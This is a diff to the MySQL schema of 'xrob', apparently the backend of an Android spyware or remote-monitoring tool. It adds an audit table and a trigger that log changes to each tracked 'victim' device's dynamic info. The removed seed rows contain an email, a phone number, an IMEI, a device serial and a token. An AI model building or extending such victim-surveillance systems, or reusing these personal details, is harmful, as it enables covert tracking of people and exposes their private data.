@@ -34,13 +34,26 @@ CREATE TABLE IF NOT EXISTS `victims` (
   `imei`              VARCHAR(16) NOT NULL,
   `device_name`       VARCHAR(50) NOT NULL,
   `device_hash`       TEXT        NOT NULL,
-  `other_device_info` TEXT        NOT NULL,
+  `device_info_static` TEXT        NOT NULL,
+  `device_info_dynamic` TEXT        NOT NULL,
   `actions`           VARCHAR(100)         DEFAULT NULL,
   `is_active`         TINYINT(4)  NOT NULL DEFAULT 1,
   `last_logged_at`    TIMESTAMP   NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
   UNIQUE KEY `imei` (`imei`),
   UNIQUE KEY `api_key` (`api_key`)
+);
+
+DROP TABLE IF EXISTS `victim_device_info_dynamic_audit`;
+CREATE TABLE IF NOT EXISTS `victim_device_info_dynamic_audit` (
+  `id`             INT(11)   NOT NULL AUTO_INCREMENT,
+  `victim_id`      INT       NOT NULL,
+  `device_info_dynamic`    TEXT      NOT NULL,
+  `last_logged_at` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+  PRIMARY KEY (`id`),
+  FOREIGN KEY (victim_id) REFERENCES victims (id)
+    ON UPDATE CASCADE
+    ON DELETE CASCADE
 );
 
 DROP TABLE IF EXISTS `client_victim_relations`;
@@ -237,18 +250,21 @@ END$$
 
 DELIMITER ;
 
-INSERT INTO xrob.clients (id, username, pass_hash, api_key, email, is_verified_email, is_premium_client, is_active, client_code, last_logged_at)
-VALUES (1, 'testuser', 'kd0BXTd3E1YabZGWqiTCCQ==', 'Yb3WAu3JPU', 'theapache64@gmail.com', 0, 0, 1, '1111111111',
-        '2016-09-16 21:42:06');
-INSERT INTO xrob.victims (id, victim_code, name, email, phone, fcm_id, fcm_updated_at, api_key, imei, device_name, device_hash, other_device_info, actions, is_active, last_logged_at)
-VALUES (1, 'Ieed0LYeYo', NULL, 'shifar@rainhopes.com', '8089510045',
-        'dKVioSY6lFo:APA91bHH28BRc5uR4dY_WKNKnNzZhc0kVW9Ha8gJAFYKCKZU6mhMuZCB2_lMD_Vq9REG0ki176kaG16spuplSBXa6sSqQzz401fkTO1RWR4r1ZBJUwtBqcaXrRQr62W5XQCjtLkp7VDS',
-        NULL, 'BCO6wFaWVI', '911478800901601', 'COOLPAD CP8676_I02', 'vFVqt2ZWedwCM1vTbunD8zIgIl61kpvrrCCDWcx5yA1wYOJW8M7ben6voDpQTD7H
-',
-        'Build.BOARD=unknown,Build.BOOTLOADER=unknown,Build.BRAND=Coolpad,Build.DEVICE=CP8676_I02,Build.FINGERPRINT=Coolpad/CP8676_I02/CP8676_I02:5.1/LMY47D/5.1.023.P1.151224.8676_I02:user/release-keys,Build.DISPLAY=V036,Build.HARDWARE=mt6735,Build.HOST=ubuntu,Build.ID=LMY47D,Build.PRODUCT=CP8676_I02,Build.SERIAL=FQEY69Z9HMMJSKFA,Build.getRadioVersion()=MOLY.LR9.W1444.MD.LWTG.MP.V16.P24~ 2015/09/14 10:02',
-        NULL, 1, '2016-09-16 21:46:17');
-INSERT INTO xrob.client_victim_relations (id, client_id, victim_id, last_logged_at)
-VALUES (1, 1, 1, '2016-09-16 21:49:53');
+
+DELIMITER $$
+
+CREATE TRIGGER after_victim_update
+AFTER UPDATE ON victims
+FOR EACH ROW BEGIN
+  IF OLD.device_info_dynamic <> NEW.device_info_dynamic
+  THEN
+    INSERT INTO victim_device_info_dynamic_audit
+    SET victim_id = OLD.id,
+      device_info_dynamic = OLD.device_info_dynamic;
+  END IF;
+END$$
+
+DELIMITER ;
 
 
 
